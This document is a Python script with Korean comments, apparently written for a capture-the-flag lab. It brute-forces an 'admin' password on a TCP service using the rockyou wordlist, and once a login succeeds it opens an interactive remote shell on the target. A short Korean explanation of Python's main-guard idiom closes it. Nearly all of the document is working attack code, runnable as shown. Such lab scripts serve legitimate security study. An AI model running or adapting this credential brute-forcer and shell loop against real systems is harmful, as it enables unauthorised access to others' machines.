```python
import socket
import time

# 공격 대상 서버의 IP와 포트 지정
pyrat_IP = "10.10.247.143"
pyrat_PORT = 8000
# 사용할 패스워드 리스트 파일 경로
wordlist = "/usr/share/wordlists/rockyou.txt"

def send_socket(ip, port, password):
    try:
        # TCP 소켓 생성 및 연결 시도
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # 5초 타임아웃 설정
        s.connect((ip, port))  # 서버 연결

        # 사용자명(admin) 입력
        s.sendall(b'admin\n')
        resp = s.recv(1024).decode(errors="ignore")  # 서버 응답 수신

        # 패스워드 입력 프롬프트가 오면 패스워드 전송
        if "Password:" in resp:
            s.sendall(password.encode() + b"\n")
            resp = s.recv(1024).decode(errors="ignore")  # 패스워드 입력 후 응답

            # 로그인 성공 여부 확인
            if "success" in resp.lower() or "admin" in resp.lower():
                print(f"[+] Found! admin:{password} -> {resp.strip()}")

                # 로그인 성공 시 shell 명령 전송 (셸 접근)
                s.sendall(b'shell\n')
                shell_resp = s.recv(1024).decode(errors="ignore")
                print(f"[+] Shell Response: {shell_resp.strip()}")

                # 셸에 접속한 뒤, 사용자가 직접 명령어 입력 가능
                while True:
                    cmd = input("$ ")  # 명령어 입력 대기
                    if not cmd: continue  # 빈 입력 무시
                    s.sendall(cmd.encode() + b"\n")  # 명령어 전송
                    out = s.recv(4096).decode(errors="ignore")  # 명령어 결과 수신
                    print(out.strip())  # 결과 출력
                return True  # 비번 찾으면 True 반환
            else:
                # 로그인 실패 시 결과 출력
                print(f"[-] Failed: {password}")
    except Exception as e:
        # 연결 또는 통신 오류 발생 시 에러 메시지 출력
        print(f"[!] Connection error for password '{password}': {e}")
    finally:
        # 소켓 자원 정리
        try: s.close()
        except: pass
    return False  # 실패 시 False 반환

def brut_pass():
    # 패스워드 리스트 파일을 한 줄씩 읽어서 시도
    # with open(...) as file: 구문은 파일을 열고, 작업이 끝나면 자동으로 닫아줌
    # open(파일경로, 모드, 인코딩, 에러처리) 형식
    # "r"은 읽기 모드, encoding="latin-1"은 특수문자 깨짐 방지, errors="ignore"는 에러 무시
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
        # 파일을 한 줄씩 읽어서 반복
        for line in file:
            password = line.strip()  # 줄 끝 개행 문자(\n) 제거
            # send_socket 함수로 비밀번호 시도, 성공하면 반복 중단
            if send_socket(pyrat_IP, pyrat_PORT, password):
                break  # 비번 찾으면 바로 종료
            time.sleep(0.1)  # 서버에 과부하 안 주려고 0.1초 대기

if __name__ == "__main__":
    # 이 파일을 직접 실행할 때만 brut_pass() 실행
    brut_pass()
```

`if __name__ == "__main__":`는 파이썬에서 이 파일을 직접 실행할 때만 아래 코드를 실행하라는 뜻입니다.

파이썬 파일은 실행될 때마다 `__name__`이라는 특별한 변수를 자동으로 만드는데,  
직접 실행하면 `__name__` 값이 `"__main__"`이 되고,  
다른 파일에서 import하면 파일 이름이 들어갑니다.

즉,

- 직접 실행: `brut_pass()` 함수가 실행됨
- import: 함수만 가져오고 실행은 안 됨

이렇게 하면 코드 재사용이 쉬워지고, 테스트할 때도 편리합니다.  
불필요하게 함수가 자동 실행되는 걸 막아줍니다.
